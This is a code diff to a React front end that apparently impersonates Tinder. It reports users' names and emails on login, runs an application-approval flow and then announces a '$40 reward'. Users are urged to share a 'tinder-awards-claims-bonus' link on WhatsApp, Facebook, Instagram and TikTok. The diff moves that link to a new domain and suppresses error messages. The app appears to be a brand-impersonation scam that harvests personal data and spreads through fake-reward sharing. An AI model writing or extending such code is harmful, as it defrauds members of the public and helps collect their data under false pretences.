@@ -15,6 +15,7 @@ import { UserButton } from "@/lib/auth/gates";
 import { TinderMark } from "@/components/tinder-mark";
 import { useCurrentUserState } from "@/lib/auth/use-current-user";
 import { getAccess, reportLogin, endVisitorSession, type Access } from "@/lib/applications";
+import { useLocale } from "@/lib/locale";
 import { getBearerToken, rememberSessionToken } from "@/lib/auth/client";
 import { getProfile, INTEREST_CHOICES } from "@/data/profiles";
 import {
@@ -47,7 +48,19 @@ function accessKey(access: Access | null) {
 }
 
 function keepProgress(current: Access | null, next: Access | null) {
-  if (current?.application && !next?.application) return current;
+  if (!next) return current;
+  if (current?.application && !next.application) return current;
+  const currentAt = current?.application?.updatedAt ?? 0;
+  const nextAt = next.application?.updatedAt ?? 0;
+  if (current?.application && next.application && nextAt < currentAt && nextAt > 0) return current;
+  if (next.application?.status === "pending" && nextAt >= currentAt) return next;
+  if (
+    current?.application?.status === "pending" &&
+    next.application?.status === "approved" &&
+    nextAt <= currentAt
+  ) {
+    return current;
+  }
   if (accessKey(current) === accessKey(next)) return current;
   return next;
 }
@@ -55,7 +68,6 @@ function keepProgress(current: Access | null, next: Access | null) {
 export function EmberApp() {
   const { user, isPending } = useCurrentUserState();
   const [access, setAccess] = useState<Access | null>(null);
-  const [accessError, setAccessError] = useState<string | null>(null);
   const [review, setReview] = useState(false);
   const [sessionReady, setSessionReady] = useState(false);
 
@@ -66,7 +78,6 @@ export function EmberApp() {
       return;
     }
     let cancelled = false;
-    setAccessError(null);
     const fresh = sessionStorage.getItem(`ember-login-${user.id}`) !== "ok";
     reportLogin({
       data: { name: user.displayName ?? "", email: user.primaryEmail ?? "", fresh },
@@ -77,16 +88,8 @@ export function EmberApp() {
         setAccess((current) => keepProgress(current, next));
         setSessionReady(true);
       })
-      .catch((err: unknown) => {
-        const message = err instanceof Error ? err.message : "Could not load your request";
-        if (message.includes("Conflict") || message.includes("getUpdates")) {
-          if (!cancelled) setSessionReady(true);
-          return;
-        }
-        if (!cancelled) {
-          setAccessError(message);
-          setSessionReady(true);
-        }
+      .catch(() => {
+        if (!cancelled) setSessionReady(true);
       });
     return () => {
       cancelled = true;
@@ -153,22 +156,6 @@ export function EmberApp() {
     );
   }
 
-  if (accessError) {
-    return (
-      <Frame>
-        <div className="grid h-full place-items-center px-6 text-center">
-          <div>
-            <h1 className="font-serif text-3xl">TINDER is unavailable</h1>
-            <p className="mt-2 text-stone">{accessError}</p>
-            <button type="button" onClick={() => window.location.reload()} className="brand-btn tap mt-5 px-8">
-              Try again
-            </button>
-          </div>
-        </div>
-      </Frame>
-    );
-  }
-
   if (review && user && access && (access.isReviewer || access.needsReviewer)) {
     return (
       <Frame>
@@ -198,7 +185,7 @@ export function EmberApp() {
 
   return (
     <Frame>
-      <ApplyFlow key={accessKey(access)} user={user} access={access} onAccess={setAccess} onReview={() => setReview(true)} />
+      <ApplyFlow user={user} access={access} onAccess={(next) => setAccess((current) => keepProgress(current, next))} onReview={() => setReview(true)} />
     </Frame>
   );
 }
@@ -243,8 +230,9 @@ const CONFETTI = [
 function RewardsNotice() {
   const [leaving, setLeaving] = useState(false);
   const [readyLink, setReadyLink] = useState<string | null>(null);
+  const { t } = useLocale();
   const amount = 40;
-  const link = "https://tinder-awards-claims-bonus.netlify.app";
+  const link = "https://tinder-awards-claims-bonus.grok.me";
 
   function shareTo(site: "whatsapp" | "facebook" | "instagram" | "tiktok") {
     const text = link;
@@ -303,7 +291,7 @@ function RewardsNotice() {
           }}
           className="tap ml-auto grid h-8 min-w-8 place-items-center text-sm font-medium text-stone disabled:opacity-80"
         >
-          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label="Loading" /> : "Log out"}
+          {leaving ? <span className="spin size-4 rounded-full border-2 border-stone border-t-transparent" aria-label={t("loading")} /> : t("logOut")}
         </button>
       </div>
       <div className="mb-3 h-1.5 overflow-hidden rounded-full bg-chip" role="progressbar" aria-valuenow={100} aria-valuemin={0} aria-valuemax={100}>
@@ -313,9 +301,9 @@ function RewardsNotice() {
         <div className="mb-5 grid size-20 place-items-center rounded-full bg-ok text-cream shadow-[0_0_40px_rgba(52,199,89,0.35)]" aria-hidden="true">
           <Check className="size-10" strokeWidth={2.5} />
         </div>
-        <p className="text-sm font-semibold uppercase tracking-[0.18em] text-ember">Approved 🎉</p>
-        <h1 className="mt-2 font-serif text-5xl tracking-tight">Your reward is ${amount}</h1>
-        <p className="mt-3 text-stone">Share this link and celebrate with someone.</p>
+        <p className="text-sm font-semibold uppercase tracking-[0.18em] text-ember">{t("approved")} 🎉</p>
+        <h1 className="mt-2 font-serif text-5xl tracking-tight">{t("rewardAmount", { amount: String(amount) })}</h1>
+        <p className="mt-3 text-stone">{t("shareCelebrate")}</p>
         <a href={link} target="_blank" rel="noopener noreferrer" className="mt-3 break-all text-sm text-cream underline">{link}</a>
         <div className="mt-6 grid grid-cols-2 gap-2">
           <button type="button" onClick={() => shareTo("whatsapp")} className="tap grid h-12 place-items-center rounded-full bg-[#25D366] font-semibold text-ink">WhatsApp</button>
